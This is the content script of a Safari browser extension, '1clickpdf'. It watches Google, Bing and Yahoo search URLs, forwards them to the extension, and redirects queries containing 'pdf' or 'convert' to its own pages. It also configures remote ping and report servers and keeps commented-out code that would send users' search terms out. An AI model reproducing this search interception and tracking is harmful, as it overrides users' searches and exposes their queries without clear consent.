var debugging = true;

var keys = {
storage: '1clickpdf',
pdf_search: 'https://www.google.com/search?q=filetype%3Apdf&{searchTerms}',
omni_search: 'https://www.google.com/search?q={searchTerms}',
    //omni_search: 'https://www.bing.com/search?q={searchTerms}',
random: '849OQQ106&$kBDaN0iYPvyOlnCsXisi^',
ver: safari.extension.displayVersion,
os: navigator.appVersion.indexOf('Mac') != -1 ? 'mac' : 'win',
country: '',
report: true,
ping: {
check: (debugging ? 1 : 5) * 60 * 1000, // check every x minutes
send: (debugging ? 0.1 : 24) * 60 * 60 * 1000, // send if passed more than x hours from last ping
},
domains: {
main: 'http://1clickpdf.com',
ping: 'http://1clickpdf.com',
report: 'http://1clickpdf.com',
save: 'http://1clickpdf.com',
search: 'http://1clickpdf.com',
typ: 'http://bestformac.net',
},
persistant: true,
keywords: ['pdf', 'convert'],
};



console.log(location.href);

safari.self.addEventListener("message", handleMessage);
//if(location.href.indexOf('q=Hello') < 0){
//    refresh();
//}

if( ((location.href.indexOf('www.bing') > -1) && (location.href.indexOf('form=APMCS1')> -1)) ||
   ((location.href.indexOf('www.google') > -1) && (location.href.indexOf('/search?client=safari')> -1)) ||
   (((location.href.indexOf('www.yahoo') > -1) || (location.href.indexOf('search.yahoo') > -1)) && (location.href.indexOf('/search?ei=utf-8&fr=aaplw&p=')> -1)) )
{
	console.log("Step1");
    if(location.href.indexOf('q=Hello') < 0){
//        window.stop();
//        refresh();
    }
    
//        window.stop();
//    onBeforeSearch()

	console.log(document.URL);
	var newurl = document.URL;
	safari.extension.dispatchMessage(newurl);
//    onBeforeSearch(document);
	
}
if(location.href.indexOf('convert.html') < 0 && (location.href.indexOf('filetype:pdf') < 0)){
    onBeforeSearch();
}

function refresh() {
    
//    window.location.href = "https://www.google.com/search?client=safari&rls=en&q=Hello&ie=UTF-8&oe=UTF-8";
//     window.location.reload(true);
//    var url = location.origin;
//    var pathname = location.pathname;
//    var hash = location.hash;
//    location.href = "https://www.google/search?client=safari/?q=hello"
//    location = url + pathname + '?application_refresh=' + (Math.random() * 100000) + hash;
}

function handleMessage(event) {
//    onBeforeSearch(event)
//    console.log(event.name);
//    var urhell = event.name;
//    var newUrl = "";
//    console.log("Holy Step1");
//    if( urhell.indexOf('tagSearchQuery') > 0)
//    {
//        console.log("Holy Step2");
//        event.preventDefault();
//        newUrl = urhell.replace("tagSearchQuery","");
//        console.log(newUrl);
//        window.location.href = newUrl;
//
//    }

    console.log(newUrl);
}

function onBeforeSearch() {
    var searchUrl;
    let params = (new URL(document.location)).searchParams;
    let searchKeyword = params.get("q");
    var searchTerms = document.location.search;
    
    var semi_pos = document.location.href.indexOf(':');
    if (keys.keywords.indexOf(searchKeyword.toLowerCase().trim()) !== -1) {
        window.stop();
        searchUrl = safari.extension.baseURI + 'convert.html';
            window.location.href = searchUrl;
    }
    else if ( true == searchKeyword.startsWith("pdf")){
        window.stop();

        searchUrl = keys.pdf_search.replace(/\{searchTerms\}/g, ("q="+searchKeyword));
            window.location.href = searchUrl;
    } else {
//        searchUrl = keys.omni_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms));
//        storage.counter++;
//        setTimeout(function() {
//                   if (keys.report === true) {
//                   SendRequest(urls.report(searchTerms), function(ret) {
//                               log('reporting enabled: ' + searchTerms);
//                               });
//                   }
//                   }, 50);
//        Store.setItem(keys.storage, storage);
    }
    console.log('searchUrl: ' + searchUrl);

}


